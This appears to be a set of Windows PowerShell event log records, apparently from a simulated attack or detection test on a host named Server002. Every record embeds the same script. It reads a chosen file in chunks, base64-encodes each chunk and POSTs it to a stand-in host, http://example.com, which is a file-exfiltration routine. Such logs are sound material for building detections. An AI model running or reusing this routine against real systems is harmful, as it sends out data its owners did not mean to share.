{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-21 12:25:07.9030599"},"EventRecordID":"1043","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Registry, Started, \tProviderName=Registry\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=1\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=a5862e9d-5d85-458b-8e35-640313f1fce4\r\n\tHostApplication=powershell.exe &amp; {$file = [System.IO.File]::OpenRead([User specified])\r\n$chunkSize = 1024 * 1KB\r\n$buffer = New-Object Byte[] $chunkSize\r\n\r\nwhile ($bytesRead = $file.Read($buffer, 0, $buffer.Length)) {\r\n $encodedChunk = [Convert]::ToBase64String($buffer, 0, $bytesRead)\r\n Invoke-WebRequest -Uri http://example.com -Method Post -Body $encodedChunk\r\n}\r\n$file.Close()}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-21 12:25:07.9183897"},"EventRecordID":"1044","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Alias, Started, \tProviderName=Alias\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=3\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=a5862e9d-5d85-458b-8e35-640313f1fce4\r\n\tHostApplication=powershell.exe &amp; {$file = [System.IO.File]::OpenRead([User specified])\r\n$chunkSize = 1024 * 1KB\r\n$buffer = New-Object Byte[] $chunkSize\r\n\r\nwhile ($bytesRead = $file.Read($buffer, 0, $buffer.Length)) {\r\n $encodedChunk = [Convert]::ToBase64String($buffer, 0, $bytesRead)\r\n Invoke-WebRequest -Uri http://example.com -Method Post -Body $encodedChunk\r\n}\r\n$file.Close()}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-21 12:25:07.9183897"},"EventRecordID":"1045","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Environment, Started, \tProviderName=Environment\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=5\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=a5862e9d-5d85-458b-8e35-640313f1fce4\r\n\tHostApplication=powershell.exe &amp; {$file = [System.IO.File]::OpenRead([User specified])\r\n$chunkSize = 1024 * 1KB\r\n$buffer = New-Object Byte[] $chunkSize\r\n\r\nwhile ($bytesRead = $file.Read($buffer, 0, $buffer.Length)) {\r\n $encodedChunk = [Convert]::ToBase64String($buffer, 0, $bytesRead)\r\n Invoke-WebRequest -Uri http://example.com -Method Post -Body $encodedChunk\r\n}\r\n$file.Close()}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-21 12:25:07.9543255"},"EventRecordID":"1046","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"FileSystem, Started, \tProviderName=FileSystem\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=7\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=a5862e9d-5d85-458b-8e35-640313f1fce4\r\n\tHostApplication=powershell.exe &amp; {$file = [System.IO.File]::OpenRead([User specified])\r\n$chunkSize = 1024 * 1KB\r\n$buffer = New-Object Byte[] $chunkSize\r\n\r\nwhile ($bytesRead = $file.Read($buffer, 0, $buffer.Length)) {\r\n $encodedChunk = [Convert]::ToBase64String($buffer, 0, $bytesRead)\r\n Invoke-WebRequest -Uri http://example.com -Method Post -Body $encodedChunk\r\n}\r\n$file.Close()}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-21 12:25:07.9543255"},"EventRecordID":"1047","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Function, Started, \tProviderName=Function\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=9\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=a5862e9d-5d85-458b-8e35-640313f1fce4\r\n\tHostApplication=powershell.exe &amp; {$file = [System.IO.File]::OpenRead([User specified])\r\n$chunkSize = 1024 * 1KB\r\n$buffer = New-Object Byte[] $chunkSize\r\n\r\nwhile ($bytesRead = $file.Read($buffer, 0, $buffer.Length)) {\r\n $encodedChunk = [Convert]::ToBase64String($buffer, 0, $bytesRead)\r\n Invoke-WebRequest -Uri http://example.com -Method Post -Body $encodedChunk\r\n}\r\n$file.Close()}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-21 12:25:07.9543255"},"EventRecordID":"1048","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Variable, Started, \tProviderName=Variable\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=11\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=a5862e9d-5d85-458b-8e35-640313f1fce4\r\n\tHostApplication=powershell.exe &amp; {$file = [System.IO.File]::OpenRead([User specified])\r\n$chunkSize = 1024 * 1KB\r\n$buffer = New-Object Byte[] $chunkSize\r\n\r\nwhile ($bytesRead = $file.Read($buffer, 0, $buffer.Length)) {\r\n $encodedChunk = [Convert]::ToBase64String($buffer, 0, $bytesRead)\r\n Invoke-WebRequest -Uri http://example.com -Method Post -Body $encodedChunk\r\n}\r\n$file.Close()}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"400"},"Version":"0","Level":"4","Task":"4","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-21 12:25:08.1976879"},"EventRecordID":"1049","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Available, None, \tNewEngineState=Available\r\n\tPreviousEngineState=None\r\n\r\n\tSequenceNumber=13\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=a5862e9d-5d85-458b-8e35-640313f1fce4\r\n\tHostApplication=powershell.exe &amp; {$file = [System.IO.File]::OpenRead([User specified])\r\n$chunkSize = 1024 * 1KB\r\n$buffer = New-Object Byte[] $chunkSize\r\n\r\nwhile ($bytesRead = $file.Read($buffer, 0, $buffer.Length)) {\r\n $encodedChunk = [Convert]::ToBase64String($buffer, 0, $bytesRead)\r\n Invoke-WebRequest -Uri http://example.com -Method Post -Body $encodedChunk\r\n}\r\n$file.Close()}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=540df121-4c39-4a1e-8843-a030967feb03\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"403"},"Version":"0","Level":"4","Task":"4","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-21 12:25:08.9729405"},"EventRecordID":"1050","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Stopped, Available, \tNewEngineState=Stopped\r\n\tPreviousEngineState=Available\r\n\r\n\tSequenceNumber=15\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=a5862e9d-5d85-458b-8e35-640313f1fce4\r\n\tHostApplication=powershell.exe &amp; {$file = [System.IO.File]::OpenRead([User specified])\r\n$chunkSize = 1024 * 1KB\r\n$buffer = New-Object Byte[] $chunkSize\r\n\r\nwhile ($bytesRead = $file.Read($buffer, 0, $buffer.Length)) {\r\n $encodedChunk = [Convert]::ToBase64String($buffer, 0, $bytesRead)\r\n Invoke-WebRequest -Uri http://example.com -Method Post -Body $encodedChunk\r\n}\r\n$file.Close()}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=540df121-4c39-4a1e-8843-a030967feb03\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
